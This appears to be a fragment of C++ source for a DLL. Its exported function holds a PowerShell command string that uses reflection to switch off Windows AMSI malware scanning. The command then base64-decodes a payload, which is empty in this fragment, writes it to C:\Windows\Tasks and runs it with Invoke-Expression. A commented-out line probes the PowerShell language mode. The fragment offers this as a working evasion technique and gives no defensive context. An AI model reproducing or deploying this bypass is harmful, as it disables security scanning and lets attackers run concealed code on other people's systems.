...
extern "C" __declspec( dllexport ) void VoidFunc()
{
	...
	//wchar_t* argument = L"$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Windows\\Tasks\\test2.txt";
	wchar_t* argument = L"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$encoded = \"\";$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded));$decoded | Out-File -FilePath C:\\Windows\\Tasks\\out.txt;IEX $decoded";
